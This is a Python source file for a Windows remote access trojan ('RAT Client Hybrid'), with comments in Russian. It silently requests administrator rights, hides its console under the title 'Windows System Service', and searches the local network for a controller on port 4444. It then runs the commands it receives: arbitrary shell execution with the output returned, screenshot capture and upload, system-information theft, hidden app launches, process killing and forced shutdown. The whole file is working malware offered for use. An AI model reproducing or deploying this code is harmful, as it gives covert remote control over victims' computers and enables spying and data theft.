# -*- coding: utf-8 -*-
import sys
import os
import ctypes
import subprocess
import socket
import json
import platform
import time
import threading
import random

# ===== АВТОМАТИЧЕСКИЙ ЗАПРОС ПРАВ АДМИНИСТРАТОРА (БЕЗ ОКНА) =====
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    try:
        # Запуск с правами админа, но окно СКРЫТО (SW_HIDE = 0)
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, 
            f'"{os.path.abspath(__file__)}" --admin', 
            None, 0  # 0 = SW_HIDE (окно не показывается)
        )
    except:
        pass
    sys.exit(0)

# ===== СКРЫТИЕ КОНСОЛИ (НО ПРОЦЕСС ВИДЕН В ДИСПЕТЧЕРЕ) =====
if sys.platform == "win32":
    # Скрываем окно консоли, но процесс остаётся в списке
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    # Меняем заголовок, чтобы было понятно, что это системный процесс
    ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
    # НЕ вызываем FreeConsole() — тогда процесс виден в диспетчере

# ===== ИМПОРТЫ =====
try:
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL, CoInitialize
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    import screen_brightness_control as sbc
    import winsound
    import pygame
    import netifaces
    import psutil
    import pyautogui
except ImportError as e:
    # Если библиотек нет - пишем в лог (консоль скрыта, так что лог в файл)
    with open(os.path.expanduser("~") + "\\rat_error.txt", "w") as f:
        f.write(f"Import error: {e}\n")
        f.write("Run: pip install pycaw comtypes screen-brightness-control pygame netifaces psutil pyautogui\n")

# ===== КОНФИГУРАЦИЯ =====
SERVER_PORT = 4444
DISCOVERY_PORT = 4445

class RATClient:
    def __init__(self):
        self.sock = None
        self.running = True
        self.device_id = socket.gethostname() + "_" + str(random.randint(1000, 9999))
        self.server_ip = None
        
        # Лог в файл (для отладки)
        self.log("=== RAT Client Hybrid Started ===")
        self.log(f"Device ID: {self.device_id}")
        self.log("Консоль скрыта, но процесс виден в диспетчере задач")
        
        # Поиск сервера
        self.find_server()
        
        if self.server_ip:
            self.log(f"Server found: {self.server_ip}")
            threading.Thread(target=self.main_loop, daemon=True).start()
        else:
            self.log("Server not found, starting broadcast discovery")
            threading.Thread(target=self.broadcast_discovery, daemon=True).start()
        
        # Бесконечный цикл
        while self.running:
            time.sleep(60)
    
    def log(self, message):
        """Запись в лог-файл"""
        try:
            with open(os.path.expanduser("~") + "\\rat_log.txt", "a") as f:
                f.write(f"{time.strftime('%H:%M:%S')} - {message}\n")
        except:
            pass
    
    def get_local_ips(self):
        ips = ['127.0.0.1']
        try:
            import netifaces
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                            ips.append(ip)
        except:
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                    ips.append(ip)
            except:
                pass
        return ips
    
    def find_server(self):
        local_ips = self.get_local_ips()
        for ip in local_ips:
            try:
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_sock.settimeout(0.5)
                test_sock.connect((ip, SERVER_PORT))
                test_sock.send(self.device_id.encode())
                test_sock.close()
                self.server_ip = ip
                return True
            except:
                continue
        return False
    
    def broadcast_discovery(self):
        while not self.server_ip:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                sock.settimeout(2)
                local_ips = self.get_local_ips()
                for ip in local_ips:
                    if ip != '127.0.0.1':
                        parts = ip.split('.')
                        for i in range(1, 255):
                            target = f"{parts[0]}.{parts[1]}.{parts[2]}.{i}"
                            try:
                                sock.sendto(b"DISCOVER_RATKA", (target, DISCOVERY_PORT))
                            except:
                                pass
                data, addr = sock.recvfrom(1024)
                if data == b"RATKA_SERVER_HERE":
                    self.server_ip = addr[0]
                    self.log(f"Server found by broadcast: {addr[0]}")
                    break
                sock.close()
            except:
                pass
            time.sleep(5)
    
    def main_loop(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                self.sock.connect((self.server_ip, SERVER_PORT))
                self.sock.send(self.device_id.encode())
                self.log(f"Connected to {self.server_ip}")
                
                while self.running:
                    try:
                        data = self.sock.recv(4096).decode()
                        if not data:
                            break
                        cmd = json.loads(data)
                        self.execute(cmd)
                    except:
                        break
            except Exception as e:
                self.log(f"Connection error: {e}")
            time.sleep(5)
    
    def execute(self, cmd):
        action = cmd.get("action")
        params = cmd.get("params", {})
        self.log(f"Executing: {action}")
        
        try:
            if action == "change_wallpaper":
                path = params.get("path")
                if path and os.path.exists(path):
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
                    self.log(f"Wallpaper changed to {path}")
            
            elif action == "set_volume":
                level = params.get("level", 50)
                try:
                    CoInitialize()
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevelScalar(level / 100.0, None)
                    self.log(f"Volume set to {level}%")
                except Exception as e:
                    self.log(f"Volume error: {e}")
            
            elif action == "set_brightness":
                level = params.get("level", 50)
                try:
                    sbc.set_brightness(level)
                    self.log(f"Brightness set to {level}%")
                except Exception as e:
                    self.log(f"Brightness error: {e}")
            
            elif action == "play_sound":
                file = params.get("file")
                duration = params.get("duration", 3)
                try:
                    if file and os.path.exists(file):
                        try:
                            pygame.mixer.init()
                            pygame.mixer.music.load(file)
                            pygame.mixer.music.play()
                            time.sleep(duration)
                            pygame.mixer.music.stop()
                            self.log(f"Sound played: {file}")
                        except:
                            if file.lower().endswith('.wav'):
                                winsound.PlaySound(file, winsound.SND_FILENAME | winsound.SND_ASYNC)
                                self.log(f"Sound played (winsound): {file}")
                    else:
                        winsound.Beep(800, duration * 1000)
                        self.log(f"Beep played")
                except Exception as e:
                    self.log(f"Sound error: {e}")
                    winsound.Beep(800, duration * 1000)
            
            elif action == "run_app":
                path = params.get("path")
                if path:
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    subprocess.Popen(path, shell=True, startupinfo=startupinfo,
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    self.log(f"App started: {path}")
            
            elif action == "kill_process":
                name = params.get("name")
                if name:
                    result = subprocess.run(f"taskkill /f /im {name}", shell=True,
                                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    self.log(f"Process killed: {name}")
            
            elif action == "send_message":
                text = params.get("text", "")
                if text:
                    ctypes.windll.user32.MessageBoxW(0, text, "System", 0)
                    self.log(f"Message shown: {text[:30]}...")
            
            elif action == "lock_pc":
                ctypes.windll.user32.LockWorkStation()
                self.log("PC locked")
            
            elif action == "shutdown":
                self.log("Shutting down...")
                os.system("shutdown /s /t 5")
            
            elif action == "restart":
                self.log("Restarting...")
                os.system("shutdown /r /t 5")
            
            elif action == "get_screenshot":
                try:
                    import pyautogui
                    screenshot = pyautogui.screenshot()
                    filename = f"screenshot_{self.device_id}.png"
                    screenshot.save(filename)
                    with open(filename, "rb") as f:
                        self.sock.send(f.read())
                    os.remove(filename)
                    self.log("Screenshot sent")
                except Exception as e:
                    self.log(f"Screenshot error: {e}")
            
            elif action == "system_info":
                try:
                    import psutil
                    info = {
                        "os": platform.platform(),
                        "hostname": socket.gethostname(),
                        "cpu": platform.processor(),
                        "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " GB"
                    }
                    self.sock.send(json.dumps(info).encode())
                    self.log("System info sent")
                except Exception as e:
                    self.log(f"System info error: {e}")
            
            elif action == "open_url":
                url = params.get("url")
                if url:
                    subprocess.Popen(f"start {url}", shell=True,
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    self.log(f"URL opened: {url}")
            
            elif action == "execute_command":
                cmd_text = params.get("cmd")
                if cmd_text:
                    result = subprocess.run(cmd_text, shell=True, capture_output=True,
                                          creationflags=subprocess.CREATE_NO_WINDOW)
                    self.sock.send(result.stdout + result.stderr)
                    self.log(f"Command executed: {cmd_text[:30]}...")
        
        except Exception as e:
            self.log(f"Execute error {action}: {e}")

if __name__ == "__main__":
    # Проверка аргументов
    if len(sys.argv) >= 1:
        # Создаём лог
        try:
            with open(os.path.expanduser("~") + "\\rat_log.txt", "w") as f:
                f.write(f"=== RAT Client Hybrid Started at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        except:
            pass
        client = RATClient()
    else:
        sys.exit(0)